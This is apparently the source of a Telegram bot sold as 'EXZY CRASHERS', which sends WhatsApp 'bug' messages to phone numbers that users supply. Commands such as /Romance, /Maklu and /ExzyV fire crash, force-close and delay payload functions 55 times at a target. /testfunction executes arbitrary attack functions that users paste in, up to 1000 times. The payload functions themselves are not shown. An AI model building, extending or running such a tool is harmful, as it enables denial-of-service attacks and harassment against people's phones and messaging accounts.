#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 𝗣𝗔𝗚𝗘 𝟮/𝟯⌟
┊✦ /Ezry - Exzy To Forclose
┊☇ [not work all devices]
┊✦ /Zyper - Exzy To Delay Hard
┊☇ [not work all devices]
┊✦ /Markdwn - Bug To Crash
┊☇ [not work all devices]
┊✦ /Exblank -  Bug Blank
┊☇ [not work all devices]
┊✦ /clearbug - Clear Bug In Target
┊☇ [Clear Bug In Target]
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5888484185261216745"
            }, 
            {
                text: "⌜𝗡𝗘𝗫𝗧 𝗠𝗘𝗡𝗨⌟",
                callback_data: "/bug3", style: "primary", icon_custom_emoji_id: "5188256863627535342"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug3', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5188244915028516818">☠️</tg-emoji> 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙀𝙓𝙕𝙔 𝘾𝙍𝘼𝙎𝙃𝙀𝙍𝙎 
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 Beta
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @ikkyexzy
<tg-emoji emoji-id="5190654700919215275">😈</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> 크래셔가 돌아왔습니다. 여기 선택 버튼이 있습니다. 메뉴 버그가 있으니 현명하게 사용하세요.</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 𝗣𝗔𝗚𝗘 𝟯/𝟯⌟
#-  𝖡𝖴𝖦 𝖬𝖤𝖭𝖴 𝖥𝖮𝖱 𝖬𝖴𝖱𝖡𝖴𝖦
┊✦ /Over - Exzy To Delay
┊☇ [Delay Bebas Spam]
┊✦ /Zxyz - Exzy To Delay
┊☇ [Delay Bebas Spam]
┊✦ /Xikky - Exzy To Delay
┊☇ [Delay Bebas Spam]
┊✦ /ZyperX - Exzy To Delay
┊☇ [Delay Bebas Spam]
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜𝗕𝗔𝗖𝗞 𝗛𝗢𝗠𝗘⌟",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5463202635349781238"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

const GH_OWNER = "zakisukses1100-art";
const GH_REPO = "iky";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container", fileList = []) {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    
    const { data } = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));

            console.log("[MENGAMBIL FILE NEW]", item.path);
            fileList.push(item.path); // simpan nama file
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath, fileList);
        }
    }

    return fileList;
}

bot.command("pullupdate", checkAdmin, async (ctx) => {
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Sedang Mengambil file... mohon tunggu");

    try {
        const files = await downloadRepo("");

        // Ambil beberapa file aja biar ga kepanjangan
        const preview = files.slice(0, 10).map(f => `📄 ${f}`).join("\n");

        await ctx.reply(
`✅ Update berhasil!
📂 Total file: ${files.length}
${preview}${files.length > 10 ? "\n..." : ""}
🔁 Restarting bot...`
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

//CASE BUG DISINI \\
bot.command("Romance", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Romance 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Romance
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurBlankxForclsoe(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Romance
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("Exzcry", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Exzcry 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Exzcry
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Exzcry
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});


bot.command("Maklu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Maklu 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Maklu
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurCrash(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Maklu
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("ExzyV", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ExzyV 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: ExzyV
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurBlankxForclsoe(target);
    await jawaTimurCrash(target);
    JawaTimurDelayTahanLamaxStatus(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: ExzyV
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "𝐂𝐄𝐊 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)

bot.command("clearbug", checkWhatsAppConnection, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const q = args[0];

  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return ctx.reply(
      "❌ You are not authorized to view the premium list."
    );
  }

 
  if (sessions.size === 0) {
    return ctx.reply(
      "❌ ⵢ Sender Not Connected\nPlease /connect"
    );
  }

  
  if (!sock) {
    return ctx.reply(
      "❌ WhatsApp socket tidak aktif"
    );
  }

  
  if (!q) {
    return ctx.reply(
      "Cara Pakai Nih Njing!!!\n/clearbug 62xxx"
    );
  }

  let pepec = q.replace(/[^0-9]/g, "");

  if (pepec.startsWith("0")) {
    return ctx.reply(
      "Contoh : /clearbug 62xxx"
    );
  }

  let target = pepec + "@s.whatsapp.net";

  try {

  
    const processMessage = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/AtomicCrashers.jpg") },
      {
        caption: `
<blockquote><strong>｢ ⸸ ｣ Atomic Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Process
<blockquote><i>By @pacenicwlee</i></blockquote>
`,
        parse_mode: "HTML"
      }
    );

  
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: "𝐂𝐈𝐊𝐈𝐃𝐀𝐖 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
      });
    }

    
    await ctx.telegram.editMessageCaption(
      chatId,
      processMessage.message_id,
      undefined,
      `
<blockquote><strong>｢ ⸸ ｣ Atomic Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Success
<blockquote><i>By @pacenicwlee</i></blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

    await ctx.reply("Done Clear Bug By amba😜");

  } catch (err) {
    console.error("CLEAR BUG ERROR:", err);

    await ctx.reply(
      `Ada kesalahan saat mengirim bug.\n${err.message}`
    );
  }
});

//FUNC AMPAS LO TARO DISINI
//


bot.launch()
